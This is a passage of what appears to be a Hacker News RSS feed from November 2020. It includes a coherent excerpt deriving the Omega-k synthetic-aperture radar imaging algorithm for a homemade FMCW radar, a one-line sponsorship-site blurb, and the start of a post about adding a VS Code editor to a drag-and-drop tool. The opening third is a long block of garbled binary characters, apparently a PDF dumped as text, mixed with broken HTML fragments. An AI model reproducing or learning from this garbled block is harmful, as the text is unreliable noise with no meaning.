º£Ã˜UuqKuöÀ¶ß,VÝ\+k…<qo%û`[vØ­»lvÜñÂ·kª<1g'w»®§sv*êâ¶Ö wwvëí…]ŠµÓ.ëƒ’avbìb†©�$»¦*¼="" µq6áiú0&œ‘<­Å™¼�$áµ«oâÑ¢�kË¤aqû¥½|a•™_&áˆ="" Éo¯´õÖí«g¬°�Ø3-:w½;d"xní³‡ˆ6èÁ'‚[g1Ë#Ž¡…\‡(‘±q�áµ§£ùynl£zè¯qøf<è¹Øn!›.£Ô"i"vrajî<r®r„Á="" |}zé^Ðbv99­iò="Æí;žc}§\iÎRhÙw4'¡ËÁ¾N" àcÍˆÏ²‚~c%l)i<p¹3djÞø$="" “8hiÍ¥•„‡“hàím¾ü�%¶1‰uÔt«oee´™�kn¿,—zgŒuÅŒ–ÓŽÞ(u†="" y¨]tw$âveÓd¾]="">7H	äãíV¿†G†Ûx¸FÉy¼��L­_žk*–ÜõÅZÅ[ê1UÈÅ×½Ë:÷§�Ýy© .õjû{e æ`Ë³ ’S"z’¿ò
;×+¦âošEw`$E2€y
˜Š“j”•Î�*+HˆÅëL³‰¤ã*Ö:Pºß¸ê12¥Ž;GÏåº/8¥SN&nbsp;dFFGr�¾ŠyjXR¿®&amp;kN—Dc1
´O¼ãÆ§ë­ô`îÑ’9PÑ«Jbd�ŽØõÕ³ZHÑ·c×Ç$
µJ4i…‹±VÁ#¦)k/æÕ­OßŠmtrún€Ð×&nbsp;Ò.êén!8’vÀ3”­/ÂÖìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»l
â«ñWb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š¶:U…e¬]‡š[ñÅ
×Ã}7Â‹]\PÖ6)]Ój¸ªàqRÞ(upÒ®¹UÔ8UßN*»n¸«u«uÀ–ÁÂ¶º¾8¥vØ¢Û&nbsp;Å.Å4Þ4Æ—Ð`¤Ó©�-:”Â´ØÅi°iŠ-ÕÅZÅÅ]Š»»
»v*ß\
×L*¼oƒ’AwLšoµÔª RƒÛ%Òõ
¥�s¸§¾BBÛñÎ™&lt;÷‘I (ÎzøiôŒ¬ó C½Vg!»eÁÄ–å’èº¼¶‘U¢­z·Ú&gt;Þù	FÛñd1ôŽHqn€qõõzo”räæÐ—0‘Ëå£’@8°ª¹ìkí“ñZN˜riqH”í¶Ø8™øaEJ­îÄûàH¾”•™8*5v#±Àb‘$³VÓŒÊ©-Yi»±&gt;Þù(É†H_4ŠOª‡�"×&nbsp;¥HÉ“m"5³Õ¬Þ'é¯nÃîÉÄ´d�!a†â?�Wá’‚¤l+†Ø€B–�ŠÔ«|—6&lt;”øâÛ[®]×8â�áŠ•Ã'`VÆ*˜éúdšˆE�ºôŒ×“äm‘2¦pÆeÉ›èóØ!�¬¨ÁÏ)Ýª6¥z•LÛ•„Š¤émâÕ
Hµ…•¨ÊÛ«xÓÃ!tÝ\[¦Ž ·ÕRÊ½yoÓ#Í™¡Í(Õ&lt;Á¨ñEAA°®3ÌÌIµˆ¢‰ŠÓ“)¥6ß-àqŽ@K]ZkbO"A­rf6Õ„2o7Éi"D	©&gt;ç+8Û†¢ƒkæd›Ôi"9ßá©}ðp#Ç´žMe™
„‘N]ÆO…¬äJW–œØšt®I¬›SÅÅ]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUpªìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å[*Âk\µ‹Ž*ØÂP¸m�Ý\(u{áVë\PêáE¶*[ë…ÅW�WWuNUà×»pÛ
¯®·ŠŠ®¶)]Š»¦(\)µã…ÔÅ�O|VÝÓµ¤×®¸SÍ¼XÛ±W`WcJÞ4­cJì*ìUØ«x9%®˜UxÁkm��
â—WÛª|q¤Ú¼3˜Øni‚’%IÏ&nbsp;·C’Ÿˆän›*Ð«jðH¯Ö†£ç†í4Ècó-ÝªŠ®Ç|¯Ã¸g1d¶¾gŽöêÉÁ†Ä‡ qÓ|s‰
ÓKÌmé8$Ö›í‘–Í�¢ÂõmQãy ±ë–Æ..L•²N½�œza‰=7Ã Æ,þÕnæ@&amp;`­ë”šs#gšKq¥ßÛLÍú‰Æ�‡Ú§†HH5rf5¬NÑ¢7§*²¶ìÄ�_
ÙdCFB•Ûj×s&nbsp;oQ°$`×„)êJÓ2Ê&nbsp;*(WvYïºWºäš×uÅVô8§šüP×|Yð
÷À®¥œèÄq*&lt;ýµ=�r™ÆÜ¼9C"2O*(·põ%hÔ©&gt;�½·Æ$l¥ô°Ñ¥
›ÉNç^:K5O3zƒÑP8Ó­:ä£�†L÷³w.Å‰$žç®]N-­Â«€È’…ØØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUxÅ[Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«c¡ÅX6\Åxß}1C«L(vb®­0©n¸†.é…+�®4†ð¢ÝŠmx5À‹o¶Åq+j€W®&nbsp;¢Ú®)ºâšov^†ñRìP½qUàâËšìX¬;â­b®Å[¿\M0«T'u(·Pb›vãnµÅ]Š»\ŽJ»VúàWtÅZÅ]Š·Cá�*‰#GÑˆÅ7\‘kt¬&gt;\�Ø×o§2âµ­vÏPÔÛ¦4¦V²9}&amp;©Já¤IÕ¦¬päcÙØä@j—ëvÃ‚�CRÝØÓ©ÃÓ“âYe¨½�YÅÚ½°˜Ú!“…™Øù°2\qjR&nbsp;õÊN.ç.ŽöWcæ8nR»¸åg9Ì
íkH]v@¥Z¥i×%ÀW.?0É4Uåû°k?Ú§/âqŽ$½Ub…—ˆ¥ø«„°¶êî�¢KoM×nJz�qã’šå z!%HU‚ÆÕ
ûGj!º!�8ÔTw£Kh@©b¤4qPÞ¡¿�.Å+˜’MOlVÑ¶7kjÄ²’
:|plã.ñõ8äm¤ª·POõÊø[¸í!¼‘Èˆ’ƒ¥ra¦G¹0¨^R»Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb­�\UxÅ]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb­Ž‡`ùko¥p&nbsp;®­p)hœ!
V¸U°qCUÂ†Á¦*ÞIì«Á®+MáG'V˜O5A¾+À¦*Þ)ukŠ9-Å“`Ólb«±Wb«Á®)¼T…ã¦(o¯.k1bìUØ«±H_ZbÄ¸o¾)¶ñG6·Å.Å]ŠÓ±E¶7Å+©L-â&nbsp;·ƒ’]‡š¶
0Rº¿,i]S�+UÆ•Ø«±WWKu8«UÆ•¾¸¡¬Ux&gt;ö×¯_²EÈÊž…§y©-ÕD€Wj‘”Ë¹°ÔR®¡æk5%¡V© Sqž«&lt;ñèÇn5˜&amp;œH-p9`‰i–PM¥3ÉmyÊŽÂG¦äm·m»á¢ÉJ^Ý–»N»l2VÖB˜5P‰··šè•Œ3S}°0¹)ÍDJ¸£wñ´UsRÂŽ«°%¬	]áŠ»¶*\Â¸¤8np)T"ƒ‡.EWb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØªà1UØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«c¡ÅX8ßïËX8øâ‡LT¸ákCxT»®,]\U±†Õv4‹lcI_×„
ƒC�*¼±E-®š\$*ì
Õ1UÃ}±UÃÃowLUxñÅ!Pâ¥®XªìUjâ’».Å]�\N–Áé…‰½ð%i8i]Š¸iW�^˜]Š€„·ÓAo
Aur4–öÅ]O|m]¶j´ÃIvV©…m¼‡cjìy«]1¤®Àá†•w|Y6øàWT‘Zâ¥¡×–ñ*ˆY��RÄl›Q]«Š
JM9˜&nbsp;—P|{dLm²áBÏ3\9‘ÍI=p€Ä›)¾‹§Ãr%–äb€NL{jdg.æÜprÉ­´½`¢GxÜî@b@ö©í•I¼c�nóC³Ô€[{¨–áMB2öÀûâ&amp;BeˆK‘Ý…_é÷d�Äe�ìŸ‘ï–F@òqgE2L]BF)xØlôÅ!¥È¥v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®ÅWŠ®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š¶:U‚ƒJe¬V&nbsp;b†±CUÂ¥¼(k
\U¼‘Cy­òÉ"›¸R½M«²*ì%[UøÙ Up8UØØUw\
ØÂ­àVÁ¦*¸|±eÍ}G\X´MqWLR×.Å
àU½ð«xB†É®  ÀÄ©-ãHu+�Alm‹.mŸX¸b«°

±Vð¤;Mà¤5LRÞ*ìmÀ®ÆÕØÚ»vI\¸]‰BóŠZþ¸½¾ÃV­ÄZtìq)M&nbsp;Ðï'·¢Ê�ÑˆÚ™0Ø1–Í@íŠ49 m�²ÕÅ{âª�I©íŠ@NñdX
úH	¯…rÚeÑ»—‚žƒ³(Õéô`	‘’Û{š7R
j)‰ËaóCD†¨–áHèûÓ*8ûœ�ž¶;£çÓô«øÒâxÖ]øÃAÌìÈñ³9F2v÷$3ù&gt;v%­dGˆîµ?�ÉŒ½í'Lz ­|³s5VSè0n�Ü{a9cóÙ|�:«1¹Š�¶&amp;¿vGÅeùcÞÅ¦µ–Ýä�Ð†ŒüT,»k1­”1`ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±VÀ®*¸
b­â®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š¶:U‚Lµƒ�¥1Bî¸¡flÙ%.Å‹XPØÆÕ²p£›`b–éŠ¯óUõÈ¥Ç8tÉªàr$*üUÕÂ­†®E+«íŠ\U_ž*Ø5Å[Å[˜ªüYsv,]Š»
ªðk�+±Bß|T»|)\!‚ü$«±æ®È$60©hb…êl&nbsp;“íŠiY­fV¡‰ëJô9SÂWýRjWÒz|±´˜”?L•±·cknÆÖÝ‚Ô;$»"®Å‹±d…]…\¸¤»/®)rüD‹'¢ZivEä@ TW©÷Ìs"æGZo-G«ÀÜ¢?iH©¥qñà­Â£k/nóE×&nbsp;QáL¾)%7zUö¯v§Ñ+•¨6ÎÙ1!ÂXå2›Éå;%d„\8�×¸5ö¥6Èx¥°é£ÊÔ—È¬Œ]+
Ôü=¾ü|eü¥ueÚZÄIUh&gt;M¿®VIoŒG$Æ‹gr
*úm×¥i÷á!Œ±D¥ùdª†í’Î-;MŠ98«MÉ¯L2’1ÀMÞ“owµ±@ÝA¦DLŽi–1.ICi÷,Še`�M=éòÉq³Õ™iNb…¦ªö§‡¾U''&nbsp;¿R¹ˆ€XŽ=<h#c)È0ÙuikühÇ-áqŒ÷v¸ÖÓu#�cÅ©ÜÇÇ3“dŽöÐ‡f†&�;ò§�nh™g¹-É5»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»l â«úb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*Øèqv\µƒg®(­0¡Ç="" µ„!Ã¾(!Øb«c="" ­.«½Ærâlj[;¦="" «uup="²)¥ÔÅ" ôÂ«Á®ov*»ß]Š»lrº´ëŠ·Š�[sk‰®(v(.¤-\%jªâ»x�€[Â]‘p¹qir¯& tÒ§¦(z.�kognxzo#="" Úµå˜ó$—?dbä˜,ÃÔ£á‚�êú…ü0Àâ5©±¦s˜æŒÜ‰'¹ËÝqkv*ì,ƒ°•ve]ŠÓ²@+°«Ž)="" ôÃok—í="" y42jpÑh:öy="" ÂÓË}yâŠez�aúvcmÃ%¯m„\ÝpÐ–®û™Ø0€³»Ðäº#"²�†ƒ|Ç«sl©,0­rz€ÃöºÔäí®“¸Ú="" ”’qÈõ="" ä9¶Špcm˜èÇš95+gõd pq ÷¥“kpÐŽ@sÃ$="" Äå,w 4eƒ1Ç“]ñru¼©lÌ�aáßºƒhéhÕt«�w="" Ð×®g“3ëc7:›c)@Àsb¨9`�´™Ò_t¡£õí_!Œ»Ðé!p7ÂkmÓú3@$çmÛörnÅÎŠ®»¦µ�)-e-lvµ?íc="" _5Ël^2Ÿ="" ·jÔå�yã…c|_*="" ð°v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®ÅwŠ®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«c¡Åxz7…="" ±c�Â®Å‹Ži-Ö¸†.ÅwlrØÂ="" lhwtÁÍ*ƒzâpÖ^*ê="" u¼*¼="" »ui†•w,="" Ýf*Ø8Ò·Ó|r»lupðÅ[¤®Û4nhxáæ•pk��pÅ]‹'bÅx5É‚Àj‚Œµ·v’2pÒµ©d="" m„sýki‚Ú1r*š€w«á�Œ¯fÜ˜ÀÝ4†¸<£ØðñÓŠÝõ{«a*}±°ybžy¤‚œûýùÎ="" ªëqªÛ1¡@ÁË( Á2êp©Øi4ìiiØ)]„»wb»="" »kwpØÅ!¼rÉ´�Ôf’p*wÃ*”éÈÇˆi’›»m9*pø÷'éÊêÛ¸„4ÛØ&i¤}Øšr‚‚¸dt©¸ú¥ãjí…¯®Éuåû¹ s^ûäÀkœÐböqþíjsÇ2©¡<gí“ó8="" y="" ”rkw¸l="" ¼r²}zâáx3 ãÂrpbv#â5ø±_ë�Åb’§Øãiâx—r$±;o]ñ¥n—qe‹pÓ="" �‹wi,ž¬Œô¥r]îÖ¬ŒØöÄ­«%Ëª•s@{`!m6:Ùª*�ãö¼r="" Þ&Èy5i&#‘4ï„e�Éiy5'$ÖÖ*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š¯˜«x«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*ìuØ«±wb®Å]Š»v*Øèqv\´0uhn8�°!ªä•°p µáŠé…iqé¶!]„!°p]…[Àbw="" Ž…Ø«±uà×on´ÃjÝk�-Ón´Â•ûdpí±[lm…mºâ›]¿Ž·o…mp©À¶ß^ø«`b­á%pÄ¢×`wb�]Š[®(¤]˜¬ŠizvÀyf="" c°µúÂuÔsÃ(‘§2ÂíbæqaéŽƒì³ì¿dÒ®72‚v¦="" È'3Õ•§—žb="">÷eG%9
¢Ã~�	SƒÄeà(ëZ“Z40€¬Â€‘°Ã	ïhË„‘Aäº§–îôÇãÁ¤ZWš®Ù•‚N»&amp;…”¡£¾NÚˆ¥þŒ�yðn&gt;4ÆÖ”°¡£‚•–hÞSºÕHG?yÊç”EÉÅ§3ÝœÁä(]Bº�¼:ý9IÎ\¨èÂÿòú5¢‘£§Žãs±žŒty�Ý¿Õ&amp;’ÁŠ1Ù’
¸�CŒP]ŠwÅ�o¢¢ºx@H§¾D„‰R£]¼¿ÞHÍ¶
OóPY™*ˆ
"é±+�NG^"§LPâiŠZëŠ¯o‚Ø¸`dÙÅ-Ž˜«~8¸bR\:œJC—VÇLJ·‹ ì]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±Wb®Å]Š»v*ìUØ«±VÀ®*¼</h#c)è0ùuikühç-áqœ÷v¸öóu#�cå©üçç3“džöð‡f†&�;ò§�nh™g¹-é5»v*ìuø«±wb®å]š»v*ìuø«±wb®å]š»v*ìuø«±wb®å]š»l></qo%û`[vø­»lvüñâ·kª<1g'w»®§sv*êâ¶ö></e–øê)z¡></a‡></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.thesciencecouncil.com/pdfs/PlentifulEnergy.pdf">http://www.thesciencecouncil.com/pdfs/PlentifulEnergy.pdf</a></em></p>]]>
            </description>
            <link>http://www.thesciencecouncil.com/pdfs/PlentifulEnergy.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25190008</guid>
            <pubDate>Mon, 23 Nov 2020 18:39:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A list with 200+ companies sponsoring tech newsletters and websites]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25189975">thread link</a>) | @thikari
<br/>
November 23, 2020 | https://sponsorgap.com/companies-buying-ads-and-sponsorships | <a href="https://web.archive.org/web/*/https://sponsorgap.com/companies-buying-ads-and-sponsorships">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Sponsorgap makes it easy to get a sponsor for your product. <br> </p></div></div>]]>
            </description>
            <link>https://sponsorgap.com/companies-buying-ads-and-sponsorships</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189975</guid>
            <pubDate>Mon, 23 Nov 2020 18:36:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Synthetic-Aperture Radar Imaging]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25189860">thread link</a>) | @parsecs
<br/>
November 23, 2020 | https://hforsten.com/synthetic-aperture-radar-imaging.html | <a href="https://web.archive.org/web/*/https://hforsten.com/synthetic-aperture-radar-imaging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
    <section id="content">
        <article>
            
            <div>
                
                
<p>Few years ago I did some <a href="https://hforsten.com/homemade-synthetic-aperture-radar.html">simple synthetic-aperture radar (SAR) imaging
experiments</a> with the second version of my homemade
FMCW radar. Since then I made a much improved <a href="https://hforsten.com/third-version-of-homemade-6-ghz-fmcw-radar.html">third version of the
radar</a> but didn't do any SAR measurements due to the
amount of effort it would have required. I did have plans to do some SAR
experiments afterwards but it took until now to have enough time and
motivation.</p>
<p>Synthetic aperture radar (SAR) imaging is a way to synthesize very large antenna
array by moving single antenna on a known path. If there are no moving targets
in the scene then one radar taking many measurements along a path gives the same
result as one ridiculously large radar that is as long as the movement path.</p>
<div id="centered">
    <p><img src="https://hforsten.com/img/fmcw3-sar/xsar_imaging.png.pagespeed.ic.MP13OL2L7B.png" width="40%/"></p><p>SAR imaging of a single target. As the radar
    moves the measured distance follows a parabola.</p>
</div>

<p>If we move on a straight path while radar pointing 90 degrees from the direction
of the path measures a distance to the single target, we will find that the
measured distance follows a parabola. This follows directly from the Pythagorean
theorem. The SAR imaging problem is finding out the target position from the
measured distance data. Of course in a real scene we have multiple targets and
the solution isn't as simple as looking where the closest approach is as could
be done in the picture above.</p>

<p>There are few different algorithms for solving this problem, but the one I'm
going to use is called Omega-k algorithm. It is a fast imaging algorithm
utilizing FFT which also makes it efficient to calculate on GPU. The derivation
mostly follows <a href="https://ieeexplore.ieee.org/document/7878107">a paper by Guo and
Dong</a>.</p>
<p>The radar I have is a frequency modulated constant wave (FMCW) radar. It
transmits a short frequency sweep. The transmitted waveform can be modeled as: </p>
<p>$$ s_t(\tau) = \exp(j 2 \pi f_c \tau + \pi \gamma \tau^2),\quad -T_s/2 &lt; \tau &lt; T_s/2 $$</p>
<p>, where <span>\(j&nbsp;= \sqrt{-1}\)</span>, <span>\(f_c =\)</span> RF carrier frequency, <span>\(\tau =\)</span> time variable,
<span>\(\gamma = B/T_s =\)</span> sweep bandwidth / sweep length <span>\(=\)</span> sweep rate.</p>
<p>The transmitted wave reflects off a target at some distance and is received after
time <span>\(t_d\)</span>. Ignoring the amplitude, the received wave is a time-delayed copy
of the transmitted signal: <span>\(s_r(\tau) = s_t(\tau - t_d)\)</span>. Signals from multiple
targets are summed.</p>
<p>The receiver mixes the received signal with the transmitted signal. This mixing
is called dechirping and it removes the high frequency RF component. The result
is a low frequency signal, usually some few kHz to MHz and is easy to digitize
with low-cost ADC. With the complex signals we take complex conjugate of the
transmitted signal to get the low-pass product and the resulting mixing product is:</p>
<p>$$ s_{\text{IF}}(\tau) = s_t(\tau - t_d) s_t^*(\tau) = \exp(-j 2 \pi f_c t_d
- j 2 \pi \gamma t_d \tau + j \pi \gamma \tau^2) $$</p>
<p>During SAR measurement the radar repeats this measurement while moving on
a straight path with a constant speed. The position of the radar on the path is:
<span>\(x = v \tau + x_n\)</span>, where <span>\(v\)</span> is speed of the radar platform and <span>\(x_n
= v n T_p\)</span>. <span>\(n\)</span> is the index for measurements and <span>\(T_p\)</span> is the transmit
repetition interval.</p>
<p>If the radar target is at position <span>\((x_0, y_0)\)</span> the distance to the target can
be written as:</p>
<p>$$ R(x) = \sqrt{y_0^2 + (x_0 - x)^2}&nbsp;$$</p>
<p>We set the y-coordinate of the path to be 0 and x position is limited to <span>\(-L/2
&lt; x &lt; L/2\)</span>, where <span>\(L\)</span> is length of the path.</p>
<p>Since electromagnetic waves travel at the speed of light and radar signal needs
to travel to the target and back to the radar, we get expression
for received signal time delay <span>\(t_d = 2R(x)/c\)</span>, where <span>\(c\)</span> is the speed of light.</p>
<p>The recorded signal can be written as:</p>
<p>$$ s_{\text{IF}}(\tau, x) = \exp\left(-j \frac{4 \pi}{c} (f_c + \gamma \tau) R(x)\right)
\exp\left(j \frac{4 \pi \gamma^2}{c^2} R^2(x)\right) $$</p>
<p>The last term in the above expression is called residual video phase term and
it's an undesirable by-product from dechirping operation. It should be removed
before further processing by multiplying by <span>\(\exp(-j \frac{4 \pi \gamma^2}{c^2}
R^2(x))\)</span>.  However this form is inconvenient because it depends on <span>\(R(x)\)</span>. Using
the fact that <span>\(R(x) = c t_d / 2\)</span> and that <span>\(t_d\)</span> can be expressed in terms of
frequency of the IF signal: <span>\(f = -2 \gamma R(x) / c = -\gamma t_d \Rightarrow
t_d = -\frac{f}{\gamma}\)</span> we can write the correction term as <span>\(\exp(-j \pi f^2
/ \gamma)\)</span>. This form can be applied easily to the Fourier transformed signal.</p>
<p>With RVP term removed the signal is:</p>
<p>$$ s(\tau, x_n) = \exp\left(-j \frac{4 \pi}{c} (f_c + \gamma \tau) \sqrt{y_0^2 + (x_n - x_0 + v \tau)^2}\right) $$</p>
<p>Ideally we would like to have the signal in form <span>\(\exp(-j 2 \pi f_y y_0)\exp(-j
2\pi f_x x_0)\)</span>, then we could apply two dimensional inverse Fourier transform to
get a delta function centered at <span>\((x_0, y_0)\)</span> focusing the image. Currently the
signal <span>\(s(\tau, x_n)\)</span> is not in this form and inverse Fourier transform doesn't
give anything interesting. We need to find some processing steps to apply to the
signal to get it to the required form so that inverse Fourier transform can be
applied. The reason to look specifically for this kind of form is that FFT can
be performed very efficiently.</p>
<p>As a first step, note that <span>\(\gamma\)</span> has units of Hz/s and <span>\(\tau\)</span> has units of s.
The product <span>\(\gamma \tau\)</span> has units of Hz so it's a frequency. This product is actually
instantenous modulation frequency of the sweep. We do substitution <span>\(\gamma
\tau \rightarrow f_\tau\)</span> to get rid of the time variable. <span>\(\tau\)</span> range was <span>\(-T/2
\ldots T/2\)</span> and the new range for <span>\(f_\tau\)</span> is <span>\(-B/2 \ldots B/2\)</span>.</p>
<p>$$ S(f_\tau, x_n) = \exp\left(-j \frac{4 \pi}{c} (f_c + f_\tau) \sqrt{y_0^2 + (x_n - x_0 + \frac{v f_\tau}{\gamma} )^2}\right) $$</p>
<p>Also instead of using frequency the math is cleaner and the implementation of
the algorithm is easier when using wavenumbers instead. We define range
wavenumber <span>\(K_r = K_{rc} + \Delta K_r\)</span>. <span>\(K_{rc} = \frac{4\pi f_c}{c}\)</span>, <span>\(\Delta
K_r = \frac{4\pi f_\tau}{c} = -\frac{2\pi B}{c} \ldots \frac{2\pi B}{c}\)</span>.</p>
<p>$$ S(K_r, x_n) = \exp\left(-j K_r \sqrt{y_0^2 + (x_n - x_0 + \frac{v c \Delta K_r}{4 \pi \gamma} )^2}\right) $$</p>
<p>Next step is to do Fourier transform in azimuth direction (direction of the
movement) to move also the <span>\(x_n\)</span> variable to frequency domain.</p>
<p>$$ S(K_r, K_x) = \int_{-\infty}^\infty S(K_r, x_n) \exp(-j K_x x_n)\, dx_n  = \int_{-\infty}^\infty \exp(j\Phi(x_n))\, dx_n $$</p>
<p><span>\(K_x = 2\pi f_x\)</span> is wavenumber in the azimuth direction. This integral doesn't have
exact solution, but there is a method to calculate quite accurate approximation
using a method called principle of stationary phase (PSOP). Phase of the
function being integrated can be written as:</p>
<p>$$ \Phi(x_n) = -K_r \sqrt{y_0^2 + \left(x_n - x_0 + \frac{v c \Delta K_r}{4 \pi \gamma} \right)^2} - K_x x_n $$</p>
<p>If we plot the phase <span>\(\Phi(x_n)\)</span> for some realistic values we get a plot that
looks something like below:</p>
<div id="centered">
    <p><img src="https://hforsten.com/img/fmcw3-sar/xphi_plot.png.pagespeed.ic.0z1VF8YpRH.png" width="40%/"></p><p>Phase and real part of the function being
    integrated.</p>
</div>

<p>There is one point where derivative of the phase is zero (stationary point) and
the function varies slowly, but away from that point the function is highly
oscillatory. As we integrate the function the oscillations far away from the
stationary point cancel out and mainly the area around the stationary point
contributes to the result of the integral.</p>
<p>We can expand the function around the stationary point <span>\(\frac{d}{dx_n}\Phi(x_n) \rvert_{x_n=x_n^\star} = 0\)</span>, as
<span>\(\Phi(x_n) = \Phi(x_n^\star) + 0 + \frac{1}{2}\Phi^{''}(x_n - x_n^\star)^2\)</span>.</p>
<p>Plugging the Taylor expansion in to the integral we get:</p>
<p>$$ \begin{aligned}S(K_r, K_x) &amp;\approx \exp(j\Phi(x_n^\star)) \int_{-\infty}^\infty \exp\left(j\frac{1}{2}\Phi^{''}(x_n^\star)(x_n-x_n^\star)^2\right)\, d x_n \\
&amp;= \exp(j\Phi(x_n^\star)) \int_{-\infty}^\infty \exp\left(j\frac{1}{2}\Phi^{''}(x_n^\star)s^2\right)\, d s \\
&amp;= \exp(j\Phi(x_n^\star)) \sqrt{\frac{2\pi j}{\Phi^{''}(x_n^\star)}} \end{aligned}
$$</p>
<p>Since <span>\(\Phi(x_n)\)</span> is purely real function, if <span>\(\mu\)</span> is sign of the
<span>\(\Phi(x_n^\star)\)</span>, then the square root term can be written as
<span>\(\sqrt{\frac{2\pi}{|\Phi^{''}(x_n^\star)|}} exp(j\pi \mu/4)\)</span>. The second
derivative contributes amplitude term and constant phase term, neither of them
which is important for focusing image which mainly depends on aligning the
phases. We have ignored the amplitude since beginning and it ends up being slowly
varying function so we will just approximate it away.</p>
<p>The stationary point of the function <span>\(\frac{d}{dx_n}\Phi(x_n)
\rvert_{x_n=x_n^\star} = 0\)</span> can be solved to be:</p>
<p>$$ x_n^\star = x_0 - \frac{K_x y_0}{\sqrt{K_r^2 - K_x^2}} - \frac{c \Delta K_r
v}{4\pi\gamma} $$</p>
<p>Plugging in the stationary point to the <span>\(S(K_r, K_x)\)</span> equation above we get the
solution of the integral:</p>
<p>$$ S(K_r, K_x) \approx \exp\left(j(-y_0 \sqrt{K_r^2 - K_x^2} - K_x x_0 + \frac{c \Delta K_r K_x
v}{4\pi\gamma})\right) $$</p>
<p>The last term is phase offset caused by the movement of the radar during the
sweep. It can be removed by multiplying with exponential in the opposite phase.</p>
<p><span>\(x_0\)</span> term is already in the correct form as it is multiplied only by <span>\(K_x\)</span>, but
<span>\(y_0\)</span> term depends on both <span>\(K_r\)</span> and <span>\(K_x\)</span>. <span>\(K_r, K_x\)</span> dependence can be fixed
by making a substitution <span>\(\sqrt{K_r^2 - K_x^2} \rightarrow K_y\)</span>. This step is
called Stolt interpolation as it is implemented by interpolating the data to
a new grid.</p>
<p>After the Stolt interpolation the signal is in form:</p>
<p>$$ S(K_y, K_x) = \exp(j(-K_y y_0 - K_x x_0)) $$</p>
<p>Taking 2D inverse Fourier transform gives the focused image with delta function
centered at <span>\((x_0, y_0)\)</span>.</p>

<p>The Omega-k algorithm is mainly large FFTs and interpolation. Both can be
implemented well on GPU which requires large parallelism from the program. Well
written GPU implementation should be several times faster than CPU
implementation. For convenience I'll implement the algorithm using Tensorflow
library. Although it's …</p></div></article></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hforsten.com/synthetic-aperture-radar-imaging.html">https://hforsten.com/synthetic-aperture-radar-imaging.html</a></em></p>]]>
            </description>
            <link>https://hforsten.com/synthetic-aperture-radar-imaging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25189860</guid>
            <pubDate>Mon, 23 Nov 2020 18:26:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Finally we've integrated VSCode into our Drag 'n' Drop Editor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25189821">thread link</a>) | @jranand
<br/>
November 23, 2020 | https://www.gridbox.io/blog/what-we-have-been-shipping-nov-2020/ | <a href="https://web.archive.org/web/*/https://www.gridbox.io/blog/what-we-have-been-shipping-nov-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>What we’ve shipped</p>
<h4 id="all-new-code-editor-powered-by-vs-code">All New Code Editor Powered by VS Code</h4>
<p>We've integrated Monaco Editor (VSCode) to Leverage the power and familiarity of VS Code. Use "Go to Definition,", "Replace Occurrences", Color Picker etc... Also you can use Keybindings and Quick Actions to perform common tasks speedily.</p>
<p><img src="https://res.cloudinary.com/gridbox/video/upload/v1605960274/gridbox/vs-code-like-1_vdn6gy.gif" alt="vs-code-like-1_vdn6gy.gif"></p>
<h4 id="from-design-to-coding-in-half-the-time">From Design to coding in half the time</h4>
